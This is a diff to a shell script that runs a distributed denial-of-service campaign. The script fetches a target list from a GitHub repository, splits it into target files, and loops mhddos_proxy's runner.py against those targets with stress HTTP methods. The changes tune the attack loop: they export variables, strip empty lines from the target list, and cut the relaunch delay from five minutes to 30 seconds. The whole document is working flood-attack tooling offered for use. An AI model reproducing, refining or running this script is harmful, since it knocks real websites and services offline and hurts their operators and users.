@@ -36,11 +36,11 @@ export methods="--http-methods GET STRESS"
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
-all_targets="/var/tmp/all.uaripper.targets"
+export all_targets="/var/tmp/all.uaripper.targets"
 export main_targets="/var/tmp/main.uaripper.targets"
-main_targets_tmp="/var/tmp/main_tmp.uaripper.targets"
+export main_targets_tmp="/var/tmp/main_tmp.uaripper.targets"
 export sec_targets="/var/tmp/secondary.uaripper.targets"
-sec_targets_tmp="/var/tmp/secondary_tmp.uaripper.targets"
+export sec_targets_tmp="/var/tmp/secondary_tmp.uaripper.targets"
 
 #remove previous copies
 rm -f /var/tmp/*uaripper.targets
@@ -51,6 +51,9 @@ echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/run
         echo $LINE >> $all_targets
     fi
 done
+
+#delete empty lines from file
+sed -i '/^$/d' $all_targets
 
 # put every line except last line in file $sec_targets
 head -n -2 $all_targets > $sec_targets
@@ -219,7 +222,7 @@ sleep 2
         python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
         sleep 15 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $methods&
-sleep 5m
+sleep 30
 prepare_targets_and_banner
 clear
 done
